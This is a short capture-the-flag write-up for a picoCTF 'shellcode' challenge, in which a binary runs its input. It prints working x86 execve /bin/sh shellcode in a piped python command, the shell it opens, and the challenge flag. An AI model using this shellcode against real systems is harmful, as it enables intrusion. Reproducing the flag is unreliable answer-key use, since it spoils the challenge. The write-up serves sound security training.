# shellcode
slopey112 - 4/11/19

This binary is incredibly straightforward. It takes a string and executes it. 
```
root@kali:~/Crack Me# ./vuln
Enter a string!
some shellcode
some shellcode
Thanks! Executing now...
Segmentation fault
```
So all we really need to do is pass in shellcode as our string. We'll use our [trusty shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php) and pass it in.
```
slopey112@pico-2018-shell:/problems/shellcode_2_0caa0f1860741079dd0a66ccf032c5f4$ (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'";cat) | ./vuln     
```
And we get our shell.
```
Enter a string!                                                                                                
1Ph//shh/binI°                                                                                                 
              ̀1@̀                                                                                             
Thanks! Executing now...                                                                                       
whoami                                                                                                         
slopey112                                                                                                      
cat flag.txt                                                                                                   
picoCTF{shellc0de_w00h00_8b811b44}
```
